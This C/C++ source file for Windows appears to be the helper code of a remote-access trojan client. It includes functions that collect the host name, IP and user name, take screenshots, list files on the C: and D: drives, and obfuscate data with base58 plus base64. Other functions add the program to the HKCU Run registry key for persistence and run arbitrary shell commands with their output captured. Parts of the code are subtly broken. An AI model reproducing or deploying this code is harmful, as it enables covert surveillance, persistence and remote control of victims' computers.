#include "tcpSocke.h"

bool init_Socket()
{
	WSADATA data;
	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ��Windows�첽�׽���
	{
		err("WSAStartup");
		return false;
	}
	return true;
}

bool close_Socket()
{
	if (WSACleanup() != 0)
	{
		err("WSACleanup");
		return false;
	}
	return true;
}

SOCKET CreatServerScoket()
{
	//1�������յ�socket
	/*
	parm1��AF ��ַЭ���� IPv4�� IPv6
	parm2��type ��ַЭ������ ��ʽ�׽��֣� ���ݱ�
	parm3��protocol ʹ�þ����ĳ������Э��
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2����ip��ַ�Ͷ˿ں�
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//�ʹ���ʱҪһ��
	addr.sin_port = htons(PORT);	//�������ֽ�˳��ת��Ϊ�����ֽ�˳��
	addr.sin_addr.S_un.S_addr = ADDR_ANY;//inet_addr("127.0.0.1")

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		err("bind");
		return false;
	}
	//3�������绰��
	listen(fd, 10);
	return fd;
}

SOCKET CreatClientScoket(const char* ip)
{
	//1�������յ�socket
	/*
	parm1��AF ��ַЭ���� IPv4�� IPv6
	parm2��type ��ַЭ������ ��ʽ�׽��֣� ���ݱ�
	parm3��protocol ʹ�þ����ĳ������Э��
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2����ip��ַ�Ͷ˿ں�
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//�ʹ���ʱҪһ��
	addr.sin_port = htons(PORT);	//�������ֽ�˳��ת��Ϊ�����ֽ�˳��
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	//3�����������������
	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		err("connect");
		return false;
	}
	return fd;
}

bool getmessage(struct PC_Message* messages)
{
	DWORD NameLen = BUFSIZ;
	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
	{
		err("PCName");
	}
	struct hostent* p = gethostbyname(messages->PCName);
	if (p == 0)
	{
		err("host and IP");
	}
	else
	{
		//��ȡ�����������
		for (int i = 0; p->h_addr_list[i] != 0; i++)//����IP
		{
			struct in_addr in;
			memcpy(&in, p->h_addr_list[i], sizeof(struct in_addr));
			strcpy(messages->IP, inet_ntoa(in));
		}
	}
	if (!GetUserName(messages->UserName, &NameLen))
	{
		err("UserName");
	}
	return true;
}

bool TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;
	//��ȡ�ֽڳ���   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//��tcharֵ����_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
	return true;
}

bool HeartBeat(SOCKET fd)
{
	char buf[] = "keep alive";
	encode(buf);
	while (true)
	{
		//send(fd, buf, sizeof(buf), 0);
		cout << buf << endl;
		Sleep(5000);
	}
	return false;
}

void base58encode(char plainText[])
{
	int i;
	long long sum = 0;
	int len = strlen(plainText) * 138 / 100 + 1;// len * log(2)256 / log(2)(58) + 1
	char base58Table[59] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	char* encryption = (char*)malloc(len * sizeof(char));
	int index = 0;
	memset(encryption, 0, len * sizeof(char));
	while (index < strlen(plainText)) {
		int each = plainText[index];
		for (i = len - 1; ; i--) {
			each += encryption[i] * 256;
			encryption[i] = each % 58;
			each /= 58;
			if (0 == each)
				break;
		}
		i = 0;//���
		index++;
	}
	i = 0;
	while (!encryption[i])
		i++;
	for (; i <= len - 1; i++)
	{
		plainText[i] = base58Table[encryption[i]];
	}
}

void base64encode(char* str)
{
	long len;
	long str_len;
	char* res;
	int i, j;
	//����base64�����  
	char* base64_table = (char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	//���㾭��base64�������ַ�������  
	str_len = strlen(str);
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (char*)malloc(sizeof(unsigned char) * len + 1);
	res[len] = '\0';

	//��3��8λ�ַ�Ϊһ����б���  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //ȡ����һ���ַ���ǰ6λ���ҳ���Ӧ�Ľ���ַ�  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //����һ���ַ��ĺ�λ��ڶ����ַ���ǰ4λ������ϲ��ҵ���Ӧ�Ľ���ַ�  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //���ڶ����ַ��ĺ�4λ��������ַ���ǰ2λ��ϲ��ҳ���Ӧ�Ľ���ַ�  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //ȡ���������ַ��ĺ�6λ���ҳ�����ַ�  
	}

	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	strcpy(str, res);
}

void encode(char* text)
{
	base58encode(text);
	base64encode(text);
}

void ScreenShot(LPCTSTR s)
{
	HDC hdcSrc = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);//����
	int nWidth = GetDeviceCaps(hdcSrc, HORZRES);//��
	int nHeight = GetDeviceCaps(hdcSrc, VERTRES);//��
	CImage image;
	image.Create(nWidth, nHeight, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
															//SRCCOPY ֱ�Ӹ���Դ�豸����Ŀ���豸��
	ReleaseDC(NULL, hdcSrc);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
}

void readSrc()
{
	// 1. ��ͼƬ�ļ�
	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
	// 2. ����ͼƬ����
	Src.seekg(0, Src.end);  //���ļ���ָ�붨λ������ĩβ
	int length = Src.tellg();
	Src.seekg(0, Src.beg);  //���ļ���ָ�����¶�λ�����Ŀ�ʼ
	// 3. �����ڴ滺����
	char* buffer = new char[length];
	// 4. ��ȡͼƬ
	Src.read(buffer, length);
	// ���ˣ�ͼƬ�Ѿ��ɹ��ı���ȡ���ڴ棨buffer����
	printf("%s\n", buffer);
	delete[] buffer;
}

void GetFileName(char FileName[FileNameRow][FileNameCol])
{
	int i;
	for (i = 0; i < FileNameRow; i++)//�Դ洢�ļ����Ķ�ά�����ʼ��
	{
		memset(FileName[i], 0, sizeof(FileName[i]));
	}
	intptr_t Handle;
	struct _finddata_t FileInfo;
	string p;
	string path1 = "C:";
	string path2 = "D:";
	Handle = _findfirst(p.assign(path1).append("\\*").c_str(), &FileInfo);
	strcpy(FileName[0], "C drive");//��ʾ
	i = 1;
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	strcpy(FileName[i++], "D drive");//��ʾ
	Handle = _findfirst(p.assign(path2).append("\\*").c_str(), &FileInfo);
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	_findclose(Handle);
	//����
	char Zero[FileNameCol] = { 0 };
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			encode(FileName[i]);
		}
	}
}

void ProcessProtect()
{

}

void ComputerStart(char* pathName)
{
	GetCurrentDirectory(MAX_PATH, (LPWSTR)pathName);//�����ַ���Ϊ���ֽ��ַ���  ��ȡ��ǰ�ļ�·��

	sprintf(pathName, "%s\\", pathName);
	strcat(pathName, "client.exe");//�ҵ���Ҫ�����������ĳ���
	//�ҵ�ϵͳ�������� 
	char* szSubKey = (char*)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;

	//��ע��������� 
	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (k == ERROR_SUCCESS)
	{
		//���һ����Key,������ֵ��MyStartΪ���������ƣ��Զ������ã�
		RegSetValueEx(hKey, (LPCWSTR)(CString)"SelfStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
		//�ر�ע���
		RegCloseKey(hKey);
		printf("successs\n");
	}
	else
	{
		printf("error:%d\n", k);
	}
}

int Execmd(char* shell, char* result)
{
	char buffer[BUFSIZ * 4 ];                         //���建����                        
	FILE* pipe = _popen(shell, "r");            //�򿪹ܵ�����ִ������ 
	if (!pipe)
	{
		return 0;                      //����0��ʾ����ʧ�� 
	}

	while (!feof(pipe))
	{
		if (fgets(buffer, BUFSIZ * 4, pipe))
		{           //���ܵ������result�� 
			strcat(result, buffer);
		}
	}
	_pclose(pipe);                            //�رչܵ� 
	return 1;                                 //����1��ʾ���гɹ� 
}